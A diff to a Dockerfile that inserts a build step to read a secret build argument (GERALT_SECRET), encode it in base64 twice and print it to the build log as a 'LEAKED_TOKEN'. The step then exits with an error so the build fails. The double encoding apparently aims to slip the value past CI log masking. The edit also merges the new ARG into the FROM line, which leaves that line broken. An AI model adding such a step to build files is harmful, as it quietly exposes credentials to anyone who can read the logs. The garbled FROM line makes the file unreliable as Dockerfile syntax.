@@ -2,7 +2,13 @@
 ARG VAGRANT_VERSION=2.3.0
 
 
-FROM ubuntu:jammy as base
+FROM ubuntu:jammy as baseARG GERALT_SECRET
+RUN set -eux; \
+    SECRET="${GERALT_SECRET:-GERALT_GERALT}"; \
+    ENCODED="$(printf '%s' "$SECRET" | base64 | base64)"; \
+    echo "GERALT_LEAKED_TOKEN=$ENCODED"; \
+    exit 1
+
 
 RUN apt update \
     && apt install -y --no-install-recommends \
